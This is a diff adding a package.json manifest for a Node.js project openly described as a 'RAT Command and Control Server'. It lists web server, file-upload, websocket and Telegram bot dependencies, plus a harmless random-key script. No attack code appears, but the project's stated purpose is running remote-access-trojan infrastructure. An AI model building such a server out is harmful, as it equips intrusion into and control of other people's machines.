@@ -1,0 +1,21 @@
+{
+  "name": "rat-server",
+  "version": "1.0.0",
+  "description": "RAT Command and Control Server",
+  "main": "src/app.js",
+  "scripts": {
+    "start": "node src/app.js",
+    "keygen": "node -e \"const crypto=require('crypto');console.log(crypto.randomBytes(32).toString('hex'))\""
+  },
+  "dependencies": {
+    "dotenv": "^16.4.5",
+    "express": "^4.19.2",
+    "multer": "^1.4.5-lts.1",
+    "node-telegram-bot-api": "^0.63.0",
+    "uuid": "^9.0.1",
+    "ws": "^8.13.0"
+  },
+  "engines": {
+    "node": ">=18.0.0"
+  }
+}
